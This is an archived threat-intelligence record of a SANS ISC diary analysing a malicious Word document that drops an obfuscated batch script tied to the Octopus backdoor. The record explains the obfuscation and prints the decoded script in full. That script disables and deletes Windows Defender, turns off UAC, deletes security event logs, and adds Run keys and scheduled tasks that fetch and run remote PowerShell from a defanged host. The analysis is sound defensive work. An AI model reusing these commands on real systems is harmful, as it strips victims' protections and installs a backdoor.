{
    "id": "bad53d34-8555-4966-a4ef-d1e24e61ea82",
    "created_at": "2023-01-12T15:09:01.930769Z",
    "updated_at": "2025-03-27T02:05:54.43254Z",
    "deleted_at": null,
    "sha1_hash": "95d0417bbe1ea24995886f080975a5ba063621cf",
    "title": "2022-05-09 - Octopus Backdoor is Back with a New Embedded Obfuscated Bat File",
    "authors": "",
    "file_creation_date": "2022-05-28T15:58:21Z",
    "file_modification_date": "2022-05-28T15:58:21Z",
    "file_size": 388439,
    "plain_text": "# SANS ISC: InfoSec Handlers Diary Blog - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training InfoSec Handlers Diary Blog\n\n**isc.sans.edu/diary/rss/28628**\n\n## Octopus Backdoor is Back with a New Embedded Obfuscated Bat File\n\n### Published: 2022-05-09\n Last Updated: 2022-05-09 06:19:07 UTC\n by Xavier Mertens (Version: 1)\n 2 comment(s) Last week, I found another interesting Word document that delivered an interesting malicious script to potential victims. Usually, Office documents carry VBA macros that are activated using a bit of social engineering (the classic yellow ribbon) but this time, the document did not contain any malicious code:\n```\nremnux@/MalwareZoo/20220505$ oledump.py f1763579a9319d2506ee468031e1eb1b.doc \n 1:    114 '\\x01CompObj'\n 2:   4096 '\\x05DocumentSummaryInformation'\n 3:   4096 '\\x05SummaryInformation'\n 4:   7624 '1Table'\n 5:   15906 'Data'\n 6:   4096 'WordDocument'\n\n But you can see stream 5 is called \"Data\". When you open the document, you see this:\n\n```\n\n-----\n\n### The document SHA256 is 6e3ef2551b1f34685025f9fe1d6358ef95fbe21ada8ed9de3c7c4d5070520f6eand its current VT score is 22/60[1]. The document contains embedded objects that look like PDF files but they are'nt:\n\n\n-----\n\n### If you follow the instruction and click on one of the PDF icons (all three point to the same script), the script will be executed. Let's have a look at it:\n\n\n-----\n\n### It looks pretty well obfuscated:\n```\n%xlnlrpz%%fynwfvh%%dskbaxq%.%fynwfvh%%lxckycu%%fynwfvh% %wegkoem%%tjxpouf%%tjxpouf%\n%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%weg\n /%cbwqklh%\n%fynwfvh%%bysdcmi%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%mkmhtbo%%jxdklrj%%wegkoem%\n/%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf%\n/%tjxpouf% 0 /%gfuxihu%\n\n In Microsoft batch files, \"%...%\" represents a variable. If you look carefully at the code, you see that we just have a suite of environment variables with, sometimes, clear characters. Those characters are special ones like \"/\", \".\" or numbers. The obfuscation technique used here is pretty simple but efficient. Environment variables just contain letters from A to Z:\nset wegkoem=a\nset bpltpmn=b\nset khoziql=c\nset tjxpouf=d\nset fynwfvh=e\nset gfuxihu=f\nset dskbaxq=g\nset yvyapob=h\nset pjdvllg=i\nset mnmpqbg=j\nset eeuyvwk=k\nset mkmhtbo=l\nset hxiqvtv=m\nset bysdcmi=n\nset nutqtmu=o\nset brlbmmf=p\nset hoahisa=q\nset xlnlrpz=r\nset ybbwhci=s\nset flbzyhx=t\nset jxdklrj=u\nset cbwqklh=v\nset rmyyyjm=w\nset lxckycu=x\nset tjtkrhi=y\nset ikoiset=z\n\n Once you replaced all variables with the corresponding letters, the script is easier to read but you still have to clean it:\n@%e%%c%%h%%o% %o%%f%%f%\n\n Here is the complete decoded script:\n\n```\n\n-----\n\n```\n@echo off\nreg delete \"hklm\\software\\policies\\microsoft\\windows defender\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\" /v \"disableantispyware\"\n/t reg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\" /v \"disableantivirus\" /t\nreg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\mpengine\" /v \"mpenablepus\"\n/t reg_dword /d \"0\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\real-time protection\" /v\n\"disablebehaviormonitoring\" /t reg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\real-time protection\" /v\n\"disableioavprotection\" /t reg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\real-time protection\" /v\n\"disableonaccessprotection\" /t reg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\real-time protection\" /v\n\"disablerealtimemonitoring\" /t reg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\real-time protection\" /v\n\"disablescanonrealtimeenable\" /t reg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\reporting\" /v\n\"disableenhancednotifications\" /t reg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\spynet\" /v\n\"disableblockatfirstseen\" /t reg_dword /d \"1\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\spynet\" /v\n\"spynetreporting\" /t reg_dword /d \"0\" /f\nreg add \"hklm\\software\\policies\\microsoft\\windows defender\\spynet\" /v\n\"submitsamplesconsent\" /t reg_dword /d \"0\" /f\nrem 0 - disable logging\nreg add \"hklm\\system\\currentcontrolset\\control\\wmi\\autologger\\defenderapilogger\" /v\n\"start\" /t reg_dword /d \"0\" /f\nreg add \"hklm\\system\\currentcontrolset\\control\\wmi\\autologger\\defenderauditlogger\" /v\n\"start\" /t reg_dword /d \"0\" /f\nrem disable wd tasks\nschtasks /change /tn \"microsoft\\windows\\exploitguard\\exploitguard mdm policy refresh\"\n/disable\nschtasks /change /tn \"microsoft\\windows\\windows defender\\windows defender cache\nmaintenance\" /disable\nschtasks /change /tn \"microsoft\\windows\\windows defender\\windows defender cleanup\"\n/disable\nschtasks /change /tn \"microsoft\\windows\\windows defender\\windows defender scheduled\nscan\" /disable\nschtasks /change /tn \"microsoft\\windows\\windows defender\\windows defender\nverification\" /disable\nrem disable wd systray icon\nreg delete\n\"hklm\\software\\microsoft\\windows\\currentversion\\explorer\\startupapproved\\run\" /v\n\"windows defender\" /f\nreg delete \"hkcu\\software\\microsoft\\windows\\currentversion\\run\" /v \"windows defender\"\n/f\nreg delete \"hklm\\software\\microsoft\\windows\\currentversion\\run\" /v \"windowsdefender\"\n/f\nrem remove wd context menu\nreg delete \"hkcr\\*\\shellex\\contextmenuhandlers\\epp\" /f\nreg delete \"hkcr\\directory\\shellex\\contextmenuhandlers\\epp\" /f\nreg delete \"hkcr\\drive\\shellex\\contextmenuhandlers\\epp\" /f\nrem disable wd services\n\n```\n\n-----\n\n```\nreg add hklm\\system\\currentcontrolset\\services\\wdboot /v start /t reg_dword /d\n\"4\" /f\nreg add \"hklm\\system\\currentcontrolset\\services\\wdfilter\" /v \"start\" /t reg_dword /d\n\"4\" /f\nreg add \"hklm\\system\\currentcontrolset\\services\\wdnisdrv\" /v \"start\" /t reg_dword /d\n\"4\" /f\nreg add \"hklm\\system\\currentcontrolset\\services\\wdnissvc\" /v \"start\" /t reg_dword /d\n\"4\" /f\nreg add \"hklm\\system\\currentcontrolset\\services\\windefend\" /v \"start\" /t reg_dword /d\n\"4\" /f\nreg add \"hklm\\system\\currentcontrolset\\services\\securityhealthservice\" /v \"start\" /t\nreg_dword /d \"4\" /f\nreg.exe add hklm\\software\\microsoft\\windows\\currentversion\\policies\\system /v\nenablelua /t reg_dword /d 0 /f\nreg add \"hkey_current_user\\software\\microsoft\\windows\\currentversion\\run\" /v \"#one\"\n/t reg_sz /d \"powershell -w hidden \\\"add-type -assemblyname system.core;iex (newobject net.webclient).downloadstring('hxxp://hpsj[.]firewallgateway[.]net:80/hpjs.php');\\\"\" /f\nreg add \"hkey_current_user\\software\\microsoft\\windows\\currentversion\\run\" /v\n\"#oneupdate\" /t reg_sz /d \"powershell -w hidden \\\"add-type -assemblyname\nsystem.core;iex (new-object net.webclient).downloadstring('hxxp://hpsj[.]firewallgateway[.]net:443/uddiexplorer');\\\"\" /f\n\"c:\\program files\\microsoft security client\\setup.exe\" /x /s /disableoslimit\nstart /b powershell add-mppreference -exclusionpath \"c:\" -force\nstart /b powershell add-mppreference -exclusionpath \"c:\\users\" -force\nstart /b powershell -w hidden \"iex(new-object\nnet.webclient).downloadstring('hxxp://hpsj[.]firewallgateway[.]net:443/uddiexplorer');\"\nstart /b powershell -w hidden \"add-type -assemblyname system.core;iex (new-object\nnet.webclient).downloadstring('hxxp://hpsj[.]firewall-gateway[.]net:80/hpjs.php');\"\nschtasks /create /sc minute /mo 60 /f /tn achromeupdater /tr \"powershell -w hidden\n\\\"add-type -assemblyname system.core;iex (new-object\nnet.webclient).downloadstring(''hxxp://hpsj[.]firewallgateway[.]net:80/hpjs.php''');\\\"\"\nschtasks /f /create /sc minute /mo 60 /tn achromeupdateri /tr \"powershell.exe -w\nhidden 'iex (new-object net.webclient).downloadstring(''hxxp://hpsj[.]firewallgateway[.]net:443/uddiexplorer''');'\"\nsc stop windefend\nsc config windefend start= disabled\nsc delete windefend\nsc stop wdnissvc\nsc config wdnissvc start= disabled\nsc delete wdnissvc\nsc stop sense\n\n```\n\n-----\n\n```\nsc config sense start disabled\nsc delete sense\nsc stop wuauserv\nsc config wuauserv start= disabled\nsc stop usosvc\nsc config usosvc start= disabled\nsc stop waasmedicsvc\nsc config waasmedicsvc start= disabled\nsc stop securityhealthservice\nsc config securityhealthservice start= disabled\nsc delete securityhealthservice\nsc stop sdrsvc\nsc config sdrsvc start= disabled\nsc stop wscsvc\nsc config wscsvc start= disabled\nsc stop wdiservicehost\nsc config wdiservicehost start= disabled\nsc stop wdisystemhost\nsc config wdisystemhost start= disabled\nsc stop installservice\nsc config installservice start= disabled\nsc stop vaultsvc\nsc config vaultsvc start= disabled\nsc stop spooler\nsc config spooler start= disabled\nsc stop licensemanager\nsc config licensemanager start= disabled\nsc stop diagtrack\nsc config diagtrack start= disabled\ntaskkill /f /im smartscreen.exe\ntaskkill /f /im securityhealthservice.exe\ncd c:\\\ncd c:\\program files\\\nrd /s /q \"windows defender\"\nrd /s /q \"windows defender advanced threat protection\"\nrd /s /q \"windows security\"\ncd c:\\program files (x86)\\\nrd /s /q \"windows defender\"\ncd c:\\programdata\\microsoft\nrd /s /q \"windows defender\"\nrd /s /q \"windows defender advanced threat protection\"\nrd /s /q \"windows security health\"\ncd c:\\\ncd windows\ncd system32\ndel /f windowsupdateelevatedinstaller.exe\ndel /f securityhealthsystray.exe\ndel /f securityhealthservice.exe\ndel /f securityhealthhost.exe\ndel /f securitycenterbroker.dll\ndel /f securitycenterbrokerps.dll\ndel /f securityhealthagent.dll\ndel /f securityhealthproxystub.dll\ndel /f securityhealthsso.dll\ndel /f smartscreensettings.exe\n\n```\n\n-----\n\n```\ndel /f smartscreenps.dll\ndel /f smartscreen.exe\ndel /f windows.security.integrity.dll\ndel /f windowsdefenderapplicationguardcsp.dll\ndel /f wscsvc.dll\ndel /f wscsvc.dll.mui\ndel /f wsecedit.dll\ncd winevt\\logs\ndel /f microsoft-windows-windows defender4operational.evtx\ndel /f microsoft-windows-windows defender4whc.evtx\ndel /f microsoft-windows-security-audit-configuration-client4operational.evtx\ndel /f microsoft-windows-security-enterprisedatafilerevocationmanager4operational.evtx\ndel /f microsoft-windows-security-netlogon\n\n### The domain hpsj[.]firewall-gateway[.]net is well-known, it's a good old Octopus backdoor. I already wrote a diary about it in 2020[2]! But it seems to be back with a simple but effective obfuscation technique.\n\n [1] https://www.virustotal.com/gui/file/6e3ef2551b1f34685025f9fe1d6358ef95fbe21ada8ed9d e3c7c4d5070520f6e\n [2] https://isc.sans.edu/forums/diary/Malicious+Word+Document+Delivering+an+Octopus+Ba ckdoor/26918/\n\n Xavier Mertens (@xme) Xameco Senior ISC Handler - Freelance Cyber Security Consultant PGP Key\n\n Keywords: Backdoor Bat Obfuscated Octopus Script Word 2 comment(s)\n\n```\nJoin us at SANS! Attend Reverse-Engineering Malware: Malware Analysis Tools and\n### Techniques with Xavier Mertens in Amsterdam starting Aug 15 2022\n\n Top of page Ã—\n\n Diary Archives\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-09 - Octopus Backdoor is Back with a New Embedded Obfuscated Bat File.pdf"
    ],
    "report_names": [
        "2022-05-09 - Octopus Backdoor is Back with a New Embedded Obfuscated Bat File.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536141,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1653753501,
    "ts_modification_date": 1653753501,
    "files": {
        "pdf": "https://archive.orkl.eu/95d0417bbe1ea24995886f080975a5ba063621cf.pdf",
        "text": "https://archive.orkl.eu/95d0417bbe1ea24995886f080975a5ba063621cf.txt",
        "img": "https://archive.orkl.eu/95d0417bbe1ea24995886f080975a5ba063621cf.jpg"
    }
}